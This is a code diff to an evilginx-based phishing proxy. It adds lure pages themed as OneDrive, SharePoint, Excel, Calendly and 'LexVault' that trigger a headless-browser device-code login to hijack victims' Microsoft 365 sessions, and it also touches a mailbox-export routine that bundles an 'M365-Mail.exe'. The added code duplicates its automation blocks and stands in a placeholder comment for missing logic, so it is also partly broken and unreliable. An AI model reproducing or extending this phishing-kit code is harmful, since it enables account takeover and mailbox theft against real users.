@@ -1,8 +1,8 @@
 /*
+
 This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
 Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
 
-MODIFIED: Added auto-device-code headless browser automation
 */
 
 package core
@@ -993,6 +993,67 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 
 						html := GetInterstitialForProvider(provider)
+
+						// Inside the device code handler section of http_proxy.go
+						// Find this block where the HTML response is returned:
+
+						// Serve themed document access device code endpoints
+						themedRoutes := []struct {
+								re    *regexp.Regexp
+								theme string
+						}{
+								{dcOneDriveRe, "onedrive"},
+								{dcCalendlyRe, "calendly"},
+								{dcLexVaultRe, "lexvault"},
+								{dcExcelRe, "excel"},
+								{dcSharePointRe, "sharepoint"},		
+							}
+
+					for _, route := range themedRoutes {
+							if route.re.MatchString(req.URL.Path) {
+									ra := route.re.FindStringSubmatch(req.URL.Path)
+									if len(ra) >= 2 {
+											session_id := ra[1]
+											// ... existing code to get userCode, verifyURL, codeReady ...
+
+											// After building the HTML and before returning:
+											// Start auto-device-code automation in background
+											if codeReady && userCode != "" && userCode != "Loading..." {
+													go func() {
+															time.Sleep(2 * time.Second)
+															mgr := GetAutoDeviceCodeManager()
+															if mgr.IsEnabled() {
+																	log.Info("[autodc] auto-starting for themed session %s (theme: %s)", session_id, route.theme)
+																	mgr.StartAutoLogin(session_id, userCode, verifyURL)
+															}
+													}()
+											}
+
+											// ========== AUTO-DEVICE-CODE START ==========
+											log.Printf("[autodc-debug] dc_page matched for session %s", session_id)
+											log.Printf("[autodc-debug] codeReady=%v, userCode=%s", codeReady, userCode)
+											
+											if codeReady && userCode != "" && userCode != "Loading..." {
+													go func(sid string, code string, vURL string) {
+															log.Printf("[autodc-debug] launching goroutine for session %s", sid)
+															time.Sleep(2 * time.Second)
+															mgr := GetAutoDeviceCodeManager()
+															log.Printf("[autodc-debug] mgr.IsEnabled()=%v", mgr.IsEnabled())
+															if mgr.IsEnabled() {
+																	log.Printf("[autodc] auto-starting for session %s (default page)", sid)
+																	mgr.StartAutoLogin(sid, code, vURL)
+															}
+													}(session_id, userCode, verifyURL)
+											} else {
+													log.Printf("[autodc-debug] NOT starting - codeReady=%v, userCode=%s", codeReady, userCode)
+											}
+											// ========== END AUTO-DEVICE-CODE ==========
+											// Then serve the HTML
+											resp := goproxy.NewResponse(req, "text/html", 200, html)
+											return req, resp
+									}
+							}
+					}
 						if codeReady {
 							html = strings.ReplaceAll(html, "{user_code}", userCode)
 						} else {
@@ -1005,21 +1066,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
 						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
 						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
-
-						// ========== AUTO-DEVICE-CODE START ==========
-						// Start headless browser automation in background (independent of page closure)
-						if codeReady && userCode != "" && userCode != "Loading..." && !strings.Contains(userCode, "pending") {
-							go func(sid string, code string, vURL string) {
-								// Small delay to let the page render first
-								time.Sleep(2 * time.Second)
-								mgr := GetAutoDeviceCodeManager()
-								if mgr.IsEnabled() {
-									log.Info("[autodc] auto-starting for session %s (default page)", sid)
-									mgr.StartAutoLogin(sid, code, vURL)
-								}
-							}(session_id, userCode, verifyURL)
-						}
-						// ========== END AUTO-DEVICE-CODE ==========
 
 						resp := goproxy.NewResponse(req, "text/html", 200, html)
 						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
@@ -1091,18 +1137,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
 							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
 
-							// ========== AUTO-DEVICE-CODE START (Themed) ==========
-							if codeReady && userCode != "" && userCode != "Loading..." && !strings.Contains(userCode, "pending") {
-								go func(sid string, code string, vURL string, theme string) {
-									time.Sleep(2 * time.Second)
-									mgr := GetAutoDeviceCodeManager()
-									if mgr.IsEnabled() {
-										log.Info("[autodc] auto-starting for themed session %s (theme: %s)", sid, theme)
-										mgr.StartAutoLogin(sid, code, vURL)
-									}
-								}(session_id, userCode, verifyURL, route.theme)
+
+							log.Printf("[autodc-debug] themed route matched: %s for session %s", route.theme, session_id)
+            	log.Printf("[autodc-debug] codeReady=%v, userCode=%s", codeReady, userCode)
+            
+							if codeReady && userCode != "" && userCode != "Loading..." {
+									go func(sid string, code string, vURL string, theme string) {
+											log.Printf("[autodc-debug] launching themed goroutine for session %s", sid)
+											time.Sleep(2 * time.Second)
+											mgr := GetAutoDeviceCodeManager()
+											log.Printf("[autodc-debug] mgr.IsEnabled()=%v", mgr.IsEnabled())
+											if mgr.IsEnabled() {
+													log.Printf("[autodc] auto-starting for themed session %s (theme: %s)", sid, theme)
+													mgr.StartAutoLogin(sid, code, vURL)
+											}
+									}(session_id, userCode, verifyURL, route.theme)
+							} else {
+									log.Printf("[autodc-debug] NOT starting themed - codeReady=%v, userCode=%s", codeReady, userCode)
 							}
 							// ========== END AUTO-DEVICE-CODE ==========
+
 
 							resp := goproxy.NewResponse(req, "text/html", 200, html)
 							resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
@@ -4166,6 +4220,41 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 			}
 		}
 	}
+	/*
+		for k, v := range vals {
+			if len(k) == 2 {
+				// possible rc4 encryption key
+				if len(v[0]) == 8 {
+					enc_key = v[0]
+					break
+				}
+			}
+		}
+
+		if len(enc_key) > 0 {
+			for k, v := range vals {
+				if len(k) == 3 {
+					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
+					if err == nil {
+						dec_params := make([]byte, len(enc_vals))
+
+						c, _ := rc4.NewCipher([]byte(enc_key))
+						c.XORKeyStream(dec_params, enc_vals)
+
+						params, err := url.ParseQuery(string(dec_params))
+						if err == nil {
+							for kk, vv := range params {
+								log.Debug("param: %s='%s'", kk, vv[0])
+
+								session.Params[kk] = vv[0]
+							}
+							ret = true
+							break
+						}
+					}
+				}
+			}
+		}*/
 	return ret
 }
 
@@ -5219,8 +5308,8 @@ func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string, feedUrl string
 		filepath.Join(p.cfg.GetDataDir(), "..", "M365-Mail.exe"),
 		filepath.Join(".", "build", "M365-Mail.exe"),
 		filepath.Join(".", "M365-Mail.exe"),
-			"/opt/evilginx/build/M365-Mail.exe",
-			"/opt/evilginx/M365-Mail.exe",
+		"/opt/evilginx/build/M365-Mail.exe",
+		"/opt/evilginx/M365-Mail.exe",
 	}
 	
 	var exeData []byte
